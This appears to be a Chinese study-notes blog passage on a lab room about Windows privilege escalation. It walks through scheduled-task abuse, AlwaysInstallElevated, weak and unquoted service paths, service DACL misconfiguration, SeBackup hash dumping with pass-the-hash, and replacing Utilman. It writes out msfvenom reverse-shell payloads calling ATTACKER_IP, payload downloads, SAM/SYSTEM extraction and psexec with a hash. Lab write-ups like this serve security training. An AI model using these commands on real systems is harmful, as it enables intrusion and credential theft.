<p>打开靶机，RDP连接查看下计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">schtasks /query /tn vulntask /fo list /v</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004180935425.png"></p>
<p>查看该文件的执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\tasks\schtask.bat</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004181111230.png"></p>
<p>手动启用计划任务，监听4444端口拿到shell</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004181437145.png"></p>
<h4 id="Task4-始终安装提升"><a href="#Task4-始终安装提升" class="headerlink" title="Task4 始终安装提升"></a>Task4 始终安装提升</h4><p>Windows 安装程序文件（也称为 .msi 文件）用于在系统上安装应用程序。它们通常以启动它的用户的权限级别运行。但是，可以将它们配置为从任何用户帐户（甚至是非特权帐户）以更高的权限运行。这可能会让我们生成一个以管理员权限运行的恶意 MSI 文件。</p>
<p><strong>注意：</strong> AlwaysInstallElevated 方法在此房间的计算机上不起作用，它仅供参考。</p>
<p>此方法需要设置两个注册表值。您可以使用以下命令从命令行查询这些内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer     </span><br></pre></td></tr></table></figure>

<p>为了能够利用此漏洞，两者都应该设置。否则，利用将是不可能的。如果设置了这些，您可以使用<code>msfvenom</code>生成恶意 .msi 文件，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi</span><br></pre></td></tr></table></figure>

<p>由于这是一个反向 shell，您还应该运行相应配置的Metasploit处理程序模块。传输创建的文件后，您可以使用以下命令运行安装程序并接收反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h4 id="Task5-滥用服务错误配置"><a href="#Task5-滥用服务错误配置" class="headerlink" title="Task5 滥用服务错误配置"></a>Task5 滥用服务错误配置</h4><h5 id="Windows-服务"><a href="#Windows-服务" class="headerlink" title="Windows 服务"></a>Windows 服务</h5><p>Windows 服务由<strong>服务控制管理器</strong>(SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。</p>
<p>Windows 计算机上的每个服务都有一个关联的可执行文件，每当服务启动时，SCM 都会运行该可执行文件。需要注意的是，服务可执行文件实现特殊功能以便能够与  SCM 通信，因此任何可执行文件都不能作为服务成功启动。每个服务还指定该服务将在其下运行的用户帐户。</p>
<p>为了更好地理解服务的结构，让我们使用<code>sc qc</code>命令检查 apphostsvc 服务配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc qc apphostsvc</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: apphostsvc</span><br><span class="line">        TYPE               : 20  WIN32_SHARE_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Application Host Helper Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : localSystem</span><br></pre></td></tr></table></figure>

<p>在这里我们可以看到关联的可执行文件是通过<strong>BINARY_PATH_NAME</strong>参数指定的，用于运行服务的帐户显示在<strong>SERVICE_START_NAME</strong>参数上。</p>
<p>服务具有自主访问控制列表 (DACL)，它指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。 DACL 可以从 Process Hacker 中看到（可以在您的计算机桌面上找到）：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004182204499.png"></p>
<p>所有服务配置都存储在注册表中 <code>HKLM\SYSTEM\CurrentControlSet\Services\</code> :</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004182218058.png"></p>
<p>系统中的每个服务都存在一个子项。同样，我们可以在<strong>ImagePath</strong>值上看到关联的可执行文件，并在<strong>ObjectName</strong>值上看到用于启动服务的帐户。如果已为服务配置了DACL ，它将存储在名为<strong>Security</strong>的子项中。正如您现在已经猜到的，默认情况下只有管理员可以修改此类注册表项。</p>
<h5 id="服务可执行文件的不安全权限"><a href="#服务可执行文件的不安全权限" class="headerlink" title="服务可执行文件的不安全权限"></a>服务可执行文件的不安全权限</h5><p>如果与服务关联的可执行文件的权限较弱，允许攻击者修改或替换它，则攻击者可以轻松获得该服务帐户的权限。</p>
<p>为了了解其工作原理，让我们看一下 Splinterware System Scheduler 上发现的漏洞。首先，我们将使用<code>sc</code>查询服务配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc qc WindowsScheduler</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: windowsscheduler</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : System Scheduler Service</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcuser1</span><br></pre></td></tr></table></figure>

<p>我们可以看到漏洞软件安装的服务以svcuser1身份运行，并且与该服务关联的可执行文件位于 <code>C:\Progra~2\System~1\WService.exe</code> ，然后我们继续检查可执行文件的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\thm-unpriv&gt;icacls C:\PROGRA~2\SYSTEM~1\WService.exe</span><br><span class="line">C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)</span><br><span class="line">                                  NT AUTHORITY\SYSTEM:(I)(F)</span><br><span class="line">                                  BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                  BUILTIN\Users:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)</span><br><span class="line">                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>这里有一些有趣的事情。 Everyone 组对服务的可执行文件具有修改权限 (M)。这意味着我们可以简单地用我们偏好的任何有效负载覆盖它，并且该服务将使用配置的用户帐户的权限执行它。</p>
<p>让我们使用 msfvenom 生成一个 exe-service 有效负载，并通过 python Web 服务器提供它：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>然后我们可以使用以下命令从 Powershell 中提取有效负载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>一旦有效负载位于 Windows 服务器中，我们就继续用有效负载替换服务可执行文件。由于我们需要另一个用户来执行我们的有效负载，因此我们还希望向Everyone组授予完全权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>我们在攻击者机器上启动一个反向侦听器</p>
<p>最后，重新启动服务。虽然在正常情况下，您可能需要等待服务重新启动，但您已被分配了自行重新启动服务的权限，以节省一些时间。从 cmd.exe 命令提示符使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc stop windowsscheduler</span><br><span class="line">C:\&gt; sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> PowerShell将<code>sc</code>作为<code>Set-Content</code>别名，因此您需要使用<code>sc.exe</code>才能以这种方式使用PowerShell控制服务。</p>
<p>打开靶机，RDP连接查看服务配置</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004183052333.png"></p>
<p>继续检查可执行文件的权限</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004183213556.png"></p>
<p>发现对所有人对服务的可执行文件具有修改权限 (M)，使用msf生成payload传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.250.46 LPORT=4445 -f exe-service -o rev-svc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004195936587.png"></p>
<p>然后把原来的WService文件备份，将payload文件名改为WService并赋予完全F权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move WService.exe WService.exe.bkp</span><br><span class="line">move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">icacls WService.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004200105761.png"></p>
<p>然后开启http监听，重启下服务成功接收shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc stop windowsscheduler</span><br><span class="line">sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241004200249281.png"></p>
<h5 id="未加引号的服务路径"><a href="#未加引号的服务路径" class="headerlink" title="未加引号的服务路径"></a>未加引号的服务路径</h5><p>当我们无法像以前一样直接写入服务可执行文件时，仍然有机会通过使用相当模糊的功能来强制服务运行任意可执行文件。</p>
<p>使用 Windows 服务时，当服务配置为指向“未加引号”的可执行文件时，会出现非常特殊的行为。不加引号是指未正确引用关联可执行文件的路径来解释命令中的空格。</p>
<p>作为示例，让我们看一下两个服务之间的区别（这些服务仅用作示例，可能在您的计算机中不可用）。第一个服务将使用正确的引用，以便 SCM 毫无疑问地知道它必须执行由 <code>&quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot;</code> ，后跟给定的参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc qc &quot;vncserver&quot;</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: vncserver</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : &quot;C:\Program Files\RealVNC\VNC Server\vncserver.exe&quot; -service</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : VNC Server</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>

<p><strong>请记住：PowerShell 将“sc”作为“Set-Content”的别名，因此，如果您处于PowerShell提示符中，则需要使用“sc.exe”来控制服务。</strong><br>现在让我们看看另一项没有正确引用的服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc qc &quot;disk sorter enterprise&quot;</span><br><span class="line">[SC] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: disk sorter enterprise</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 0   IGNORE</span><br><span class="line">        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Disk Sorter Enterprise</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : .\svcusr2</span><br></pre></td></tr></table></figure>

<p>当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Argument 1</th>
<th>Argument 2</th>
</tr>
</thead>
<tbody><tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>这与命令提示符如何解析命令有关。通常，当您发送命令时，空格将用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着未加引号的命令的“正确”解释是执行<code>C:\MyPrograms\Disk.exe</code>并将其余部分作为参数。</p>
<p>SCM 没有像它可能应该发生的那样失败，而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件：</p>
<ol>
<li>首先，搜索<code>C:\MyPrograms\Disk.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，则会搜索 <code>C:\MyPrograms\Disk Sorter.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，则会搜索 <code>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</code> 。此选项预计会成功，并且通常会在默认安装中运行。</li>
</ol>
<p>从这个行为来看，问题就显而易见了。如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p>
<p>虽然这听起来微不足道，但默认情况下，大多数服务可执行文件将安装在<code>C:\Program Files</code>或<code>C:\Program Files (x86)</code>下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外：</p>
<ul>
<li>某些安装程序更改已安装文件夹的权限，使服务容易受到攻击。</li>
<li>管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全局可写的，则该漏洞可以被利用。</li>
</ul>
<p>在我们的例子中，管理员将磁盘排序器二进制文件安装在<code>c:\MyPrograms</code>下。默认情况下，它继承<code>C:\</code>目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用<code>icacls</code>检查这一点：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;icacls c:\MyPrograms</span><br><span class="line">c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">              BUILTIN\Users:(I)(OI)(CI)(RX)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(AD)</span><br><span class="line">              BUILTIN\Users:(I)(CI)(WD)</span><br><span class="line">              CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p><code>BUILTIN\Users</code>组具有<strong>AD</strong>和<strong>WD</strong>权限，允许用户分别创建子目录和文件。我们可以看看当前用户的所属用户组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure>

<p>如果具有足够的权限，使用 msfvenom 创建 exe-service Payload 并将其传输到目标主机的过程与以前相同，因此请像以前一样创建以下 Payload 并将其上传到服务器。我们还将启动一个侦听器来接收反向 shell 执行时的情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe</span><br></pre></td></tr></table></figure>

<p>一旦有效负载进入服务器，请将其移动到可能发生劫持的任何位置。在这种情况下，我们将把有效负载移动到<code>C:\MyPrograms\Disk.exe</code> 。我们还将授予每个人对该文件的完全权限，以确保该服务可以执行该文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe</span><br><span class="line"></span><br><span class="line">C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>服务重新启动后，您的有效负载应该执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc stop &quot;disk sorter enterprise&quot;</span><br><span class="line">C:\&gt; sc start &quot;disk sorter enterprise&quot;      </span><br></pre></td></tr></table></figure>

<p>结果，您将获得具有 svcusr2 权限的反向 shell</p>
<h5 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h5><p>如果服务的可执行 DACL 配置良好，并且正确引用了服务的二进制路径，您仍然有机会利用该服务。如果服务 DACL （不是服务的可执行DACL ）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> 。为了您的方便，可以在<code>C:\\tools</code>中获取副本。检查 thmservice 服务DACL 的命令是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice</span><br><span class="line">  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM</span><br><span class="line">        SERVICE_QUERY_STATUS</span><br><span class="line">        SERVICE_QUERY_CONFIG</span><br><span class="line">        SERVICE_INTERROGATE</span><br><span class="line">        SERVICE_ENUMERATE_DEPENDENTS</span><br><span class="line">        SERVICE_PAUSE_CONTINUE</span><br><span class="line">        SERVICE_START</span><br><span class="line">        SERVICE_STOP</span><br><span class="line">        SERVICE_USER_DEFINED_CONTROL</span><br><span class="line">        READ_CONTROL</span><br><span class="line">  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>

<p>在这里我们可以看到<code>BUILTIN\\Users</code>组具有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置服务。</p>
<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的计算机上启动它的侦听器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe</span><br><span class="line"></span><br><span class="line">user@attackerpc$ nc -lvp 4447    </span><br></pre></td></tr></table></figure>

<p>然后我们将反向 shell 可执行文件传输到目标机器并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 。请随意使用 wget 传输您的可执行文件并将其移动到所需的位置。请记住授予每个人执行您的有效负载的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后面的空格）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc config THMService binPath= &quot;C:\Users\thm-unpriv\rev-svc3.exe&quot; obj= LocalSystem</span><br></pre></td></tr></table></figure>

<p>请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高特权帐户。要触发我们的有效负载，剩下的就是重新启动服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; sc stop THMService</span><br><span class="line">C:\&gt; sc start THMService</span><br></pre></td></tr></table></figure>

<p>我们将在攻击者的机器上收到一个具有系统权限的 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4447</span><br><span class="line">Listening on 0.0.0.0 4447</span><br><span class="line">Connection received on 10.10.175.90 50650</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<h4 id="Task6-滥用危险的特权"><a href="#Task6-滥用危险的特权" class="headerlink" title="Task6 滥用危险的特权"></a>Task6 滥用危险的特权</h4><h5 id="Windows-权限"><a href="#Windows-权限" class="headerlink" title="Windows 权限"></a>Windows 权限</h5><p>权限是帐户执行特定系统相关任务所拥有的权利。这些任务可以像关闭计算机的权限一样简单，也可以像绕过某些基于DACL的访问控制的权限一样简单。</p>
<p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">此处</a>提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的特权才有意义。您可以在<a href="https://github.com/gtworek/Priv2Admin">Priv2Admin</a> Github 项目上找到可利用权限的完整列表。</p>
<p>虽然我们不会逐一查看，但我们将展示如何滥用您可以找到的一些最常见的特权。</p>
<h5 id="SeBackup-SeRestore提权"><a href="#SeBackup-SeRestore提权" class="headerlink" title="SeBackup &#x2F; SeRestore提权"></a>SeBackup &#x2F; SeRestore提权</h5><p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何DACL 。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
<p>有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。</p>
<p>使用以下凭据通过RDP登录到目标计算机：</p>
<p><strong>用户：</strong> <code>THMBackup</code> </p>
<p><strong>密码：</strong> <code>CopyMaster555</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.255.156 /u:THMBackup /p:CopyMaster555</span><br></pre></td></tr></table></figure>

<p>该帐户属于“Backup Operators”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台</p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006105337684.png"></p>
<p>要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save hklm\system C:\Users\THMBackup\system.hive</span><br><span class="line">reg save hklm\sam C:\Users\THMBackup\sam.hive     </span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113324572.png"></p>
<p>这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的<code>smbserver.py</code>在 AttackBox 的当前目录中启动一个带有网络共享的简单SMB服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir share</span><br><span class="line">python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113550704.png"></p>
<p>并使用 impacket 检索用户的密码哈希值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113622837.png"></p>
<p>我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.255.156</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006113914630.png"></p>
<h5 id="SeTakeOwnership提权"><a href="#SeTakeOwnership提权" class="headerlink" title="SeTakeOwnership提权"></a>SeTakeOwnership提权</h5><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了多种可能性，例如，我们可以搜索作为 SYSTEM 运行的服务并获取所有权服务的可执行文件。然而，对于这项任务，我们将采取不同的路线。</p>
<p>使用以下凭据通过RDP登录到目标计算机：</p>
<p><strong>用户：</strong> <code>THMTakeOwnership</code> </p>
<p><strong>密码：</strong> <code>TheWorldIsMine2022</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.255.156 /u:THMTakeOwnership /p:TheWorldIsMine2022</span><br></pre></td></tr></table></figure>

<p>要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台</p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006114614708.png"></p>
<p>这次我们将滥用<code>utilman.exe</code>来升级权限。 Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006114702894.png"></p>
<p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p>
<p>要替换 utilman，我们将首先使用以下命令获取它的所有权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">takeown /f C:\Windows\System32\Utilman.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006114833726.png"></p>
<p>请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要为您的用户授予 utilman.exe 的完全权限，您可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115250040.png"></p>
<p>然后，我们将用 cmd.exe 的副本替换 utilman.exe：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy cmd.exe utilman.exe</span><br></pre></td></tr></table></figure>

<p>要触发 utilman，我们将从开始按钮锁定屏幕：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115408435.png"></p>
<p>最后，继续单击“轻松访问”按钮，该按钮将以系统权限运行 utilman.exe。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115354296.png"></p>
<h5 id="SeImpersonate-SeAssignPrimaryToken提权"><a href="#SeImpersonate-SeAssignPrimaryToken提权" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken提权"></a>SeImpersonate &#x2F; SeAssignPrimaryToken提权</h5><p>这些权限允许进程模拟其他用户并代表他们执行操作。模拟通常包括能够在另一个用户的安全上下文下生成进程或线程。</p>
<p>当您考虑FTP服务器的工作原理时，就很容易理解模拟。 FTP服务器必须限制用户只能访问他们应该被允许查看的文件。</p>
